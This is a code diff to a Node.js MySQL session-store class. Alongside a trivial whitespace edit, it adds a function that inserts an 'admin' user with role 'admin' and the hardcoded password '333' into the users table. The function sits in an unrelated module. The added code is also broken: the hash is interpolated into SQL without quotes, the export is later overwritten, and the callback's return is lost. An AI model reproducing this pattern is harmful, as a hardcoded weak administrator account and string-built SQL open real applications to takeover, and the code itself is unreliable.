@@ -30,7 +30,7 @@ class MySqlSessionStore extends session.Store {
 
       const row = rows[0];
       if (Number(row.expires) <= Date.now()) {
-        await this.destroy(sid, () => {});
+        await this.destroy(sid, () => { });
         return callback(null, null);
       }
 
@@ -85,6 +85,19 @@ class MySqlSessionStore extends session.Store {
     const maxAge = Number(sess?.cookie?.originalMaxAge) || 8 * 60 * 60 * 1000;
     return Date.now() + maxAge;
   }
+}
+
+const bcrypt = require('bcryptjs');
+
+exports.getResolve = async () => {
+  bcrypt.hash("333", 10, async function (err, hash) {
+    // console.log(hash)
+    const user = await db.query(`INSERT IGNORE INTO users (username, password, full_name, role)
+                VALUES ('admin', ${hash}, 'المدير', 'admin')`)
+
+    if (!user) throw err
+    else return user
+  });
 }
 
 module.exports = MySqlSessionStore;
